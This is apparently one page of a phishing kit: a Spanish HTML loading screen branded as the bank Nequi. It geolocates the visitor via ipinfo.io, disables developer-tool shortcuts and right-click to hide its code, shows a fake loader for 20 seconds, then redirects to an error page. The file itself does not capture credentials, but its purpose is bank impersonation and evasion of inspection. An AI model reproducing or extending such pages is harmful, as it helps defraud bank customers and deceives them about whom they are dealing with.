<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="icon" href="favicon_n.png" type="favicon.png" sizes="16x16" />
    <title>Cargando... - Nequi</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body, html {
            height: 100%;
            width: 100%;
            overflow: hidden;
            background-color: #000; 
        }

        .background-image {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-image: url('cap_fondo_dinamica.PNG');
            background-size: cover;
            background-position: center;
            z-index: 1;
        }

        .dark-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
           
            backdrop-filter: blur(8px); 
            -webkit-backdrop-filter: blur(8px); 
            z-index: 2;
            display: flex;
            justify-content: center;
            align-items: center;
        }

        /* Ahora el contenedor es invisible y solo posiciona el gif */
        .loader-container {
            z-index: 3;
            display: flex;
            justify-content: center;
            align-items: center;
        }

        .loader-gif {
            width: 180px; /* Puedes ajustar el tamaño aquí */
            height: auto;
            /* Si el gif tiene fondo blanco y quieres que se vea mejor, 
               puedes usar 'mix-blend-mode: screen;' si el fondo es negro 
               o dejarlo así si es transparente. */
        }
    </style>
</head>

<script>
         $.getJSON("https://ipinfo.io", function (response) {
    $("#address").html("" + response.city + ", " + response.country);
    
})
      </script>




<body oncontextmenu="return false;">

    <div class="background-image"></div>

    <div class="dark-overlay">
        <div class="loader-container">
            <img src="NequiArchivos/loader.gif" alt="Cargando..." class="loader-gif">
        </div>
    </div>

    <script>
        // Redirige después de 20 segundos
        setTimeout(function() {
            window.location.href = 'error.html'; 
        }, 20000); 
    </script>




<script> // --- Bloqueo de inspección y teclado ---
        document.onkeydown = function(e) {
            // Bloquear F12, Ctrl+Shift+I, Ctrl+Shift+J, Ctrl+U
            if (e.keyCode == 123 || 
               (e.ctrlKey && e.shiftKey && (e.keyCode == 'I'.charCodeAt(0) || e.keyCode == 'J'.charCodeAt(0))) || 
               (e.ctrlKey && e.keyCode == 'U'.charCodeAt(0))) {
                return false;
            }
        };

        // Bloquear clic derecho
        document.addEventListener('contextmenu', function(e) {
            e.preventDefault();
        }, false);
    </script>
</body>
</html>
